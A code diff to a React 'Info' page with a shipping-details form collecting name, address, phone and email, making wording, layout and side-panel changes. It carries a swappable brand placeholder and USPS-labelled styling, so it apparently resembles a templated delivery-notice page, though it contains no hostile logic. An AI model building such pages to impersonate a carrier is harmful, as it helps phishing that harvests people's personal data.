@@ -212,8 +212,8 @@ export default function Info() {
           <div className="alz-step-head">
             <div>
               <div className="alz-badge">{BRAND.name}</div>
-              <h1 className="alz-step-title">Confirm address</h1>
-              <p className="alz-step-subtitle">Enter the delivery details below.</p>
+              <h1 className="alz-step-title">Shipping details</h1>
+              <p className="alz-step-subtitle">Fill in the form and continue.</p>
             </div>
           </div>
           <div className="alz-track mt-3">
@@ -221,25 +221,19 @@ export default function Info() {
           </div>
         </div>
 
-        <div className="alz-flow-grid alz-usps-flow-grid">
+        <div className="alz-flow-grid alz-usps-flow-grid alz-info-single-column">
           <div className="alz-card alz-usps-form-card">
-            <div className="alz-section-eyebrow">Delivery details</div>
-            <h2 className="alz-page-title">Enter shipping info</h2>
-            <p className="alz-page-copy">{status}</p>
-            <div className="alz-brand-row mb-2">
-              {BRAND_PROMISES.map((item) => (
-                <span key={item} className="alz-brand-pill">{item}</span>
-              ))}
-            </div>
+            <div className="alz-section-eyebrow">Step 1</div>
+            <h2 className="alz-page-title">Enter address</h2>
             <div className="alz-info-cta-row">
               <button type="button" onClick={handleSubmit} disabled={loading} className="alz-btn-primary alz-info-cta-button">
                 {loading ? 'Saving...' : 'Continue'}
               </button>
-              <p className="alz-info-cta-note">Fill in the fields, then continue.</p>
+              <p className="alz-info-cta-note">Name, address, phone, email.</p>
             </div>
 
             <form
-              className="space-y-4 mt-4"
+              className="space-y-3 mt-3"
               onSubmit={(e) => {
                 e.preventDefault();
                 handleSubmit();
@@ -256,7 +250,7 @@ export default function Info() {
                 <ErrorText name="address" />
               </div>
               <div>
-                <label className="alz-field-label">Apartment, suite, unit, building, floor, etc.</label>
+                <label className="alz-field-label">Address line 2</label>
                 <input ref={(el) => (inputRefs.current.fulladdress = el)} value={form.fulladdress} onChange={(e) => setField('fulladdress', e.target.value)} className={inputClass('fulladdress')} placeholder="Apt, suite, unit, building, floor, etc. (optional)" autoComplete="address-line2" enterKeyHint="next" />
                 <ErrorText name="fulladdress" />
               </div>
@@ -293,31 +287,11 @@ export default function Info() {
               <button type="submit" disabled={loading} className="alz-btn-primary mt-2 text-lg sm:text-xl md:text-2xl">
                 {loading ? 'Saving...' : 'Continue'}
               </button>
-              <p className="alz-helper-copy text-center mt-3">
-                Check the name, address, phone, and email before you continue.
-              </p>
             </form>
 
             <div className="alz-footer">{BRAND.name} | {BRAND.portal}</div>
             <div className="text-[11px] text-center text-[#565959] mt-1">{BRAND.legal}</div>
           </div>
-
-          <aside className="alz-card alz-flow-aside alz-side-summary alz-usps-side-card">
-            <div className="alz-side-summary-title">Mailing checklist</div>
-            <div className="alz-order-mini-card">
-              <div className="alz-order-mini-thumb" />
-              <div>
-                <div className="alz-order-mini-title">Review the address on file</div>
-                <div className="alz-order-mini-copy">Confirm the name, address, ZIP Code, and contact details.</div>
-              </div>
-            </div>
-            <div className="alz-side-summary-list">
-              <div>Name exactly as entered</div>
-              <div>Street, city, state, and ZIP Code</div>
-              <div>Phone number and email</div>
-            </div>
-            <div className="alz-side-summary-box">Use the delivery details linked to this shipment.</div>
-          </aside>
         </div>
       </div>
     </div>
